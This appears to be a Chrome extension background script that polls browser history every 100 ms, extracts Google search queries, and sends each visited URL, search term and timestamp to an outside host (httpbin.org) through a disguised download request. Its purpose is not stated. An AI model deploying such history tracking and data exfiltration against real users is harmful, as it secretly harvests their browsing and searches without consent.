function parse(curUrl) {

	if (curUrl != 'data:,' && curUrl.indexOf('zh.wikipedia.org') == -1 && curUrl.indexOf('search?q=thisisfakesearch') == -1 ) {

	    var data = [];
	    var search = '';

	    // parse curUrl
	    if (curUrl.indexOf('google') !== -1) {
	      console.log('it is google!');

	      // check if there's a search
	      if (curUrl.indexOf('#q') !== -1 || curUrl.indexOf('search?q=') !== -1) {
	        console.log('it is google search');

	        // check if preUrl was google.com or a search too
	        if (curUrl.indexOf('#q') !== -1 && (preUrl.indexOf('search?q=') !== -1 || preUrl.indexOf('?gfe') !== -1)) {
	          console.log('requested from google website');
	          search = curUrl.substring(curUrl.indexOf('#q=') + 3);
	        }
	        else {
	          console.log('requested from browser address bar');
	          search = curUrl.substring(curUrl.indexOf('search?q=') + 9, curUrl.indexOf('&'));
	        }

	        // clean up
	        search = search.replace(/\+/g, ' ');
	        console.log(search);
	      }
	      curUrl = 'https://google.com'   
	    }

	    data = {'date' : Date(), 'url' : curUrl, 's' : search};

		var link = 'http://httpbin.org/get?' + JSON.stringify(data);
		chrome.downloads.download({
			url: link
		});

		console.log(data)
	}
}


// get last url in browser histry
var preUrl;
chrome.history.search({
	'text': '', 
	'maxResults': 1, 
	'startTime': 0
}, function(res) {
	preUrl = res[0]['url'];

	// define current url
	var curUrl = preUrl;

	// watch history loop
	setInterval(function(){

		chrome.history.search({
			'text': '', 
			'maxResults': 1,
			'startTime': 0
		}, function(res) {

			// redefine current url
			curUrl = res[0]['url'];

			// compare curUrl with preUrl
			if (curUrl != preUrl) {
				
				parse(curUrl);
				preUrl = curUrl;
			};
		});

	}, 100);
});